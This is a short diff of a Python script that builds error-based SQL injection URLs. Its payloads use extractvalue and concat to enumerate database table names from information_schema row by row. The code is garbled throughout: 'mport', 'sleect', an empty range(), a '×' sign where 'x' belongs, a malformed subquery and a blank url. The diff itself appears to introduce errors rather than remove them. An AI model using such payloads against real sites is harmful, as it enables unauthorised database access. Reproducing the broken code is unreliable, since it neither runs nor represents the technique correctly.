@@ -1,7 +1,7 @@
-import requests as req
+mport requests as req
 try:
 	  for i in range():
-	  	input ()  url=
+	  	  url=
 	  	  cmd = "? ord= and extracvalue(1,concat(0×3a, (sleect TABLE_NAME  from"
 	  	  cmd += "information_schema.table where TABLE_SCHEMA=database() limit "+str (i) +" ,1)(,0×3a))"
 	  	  url2 = url + cmd 
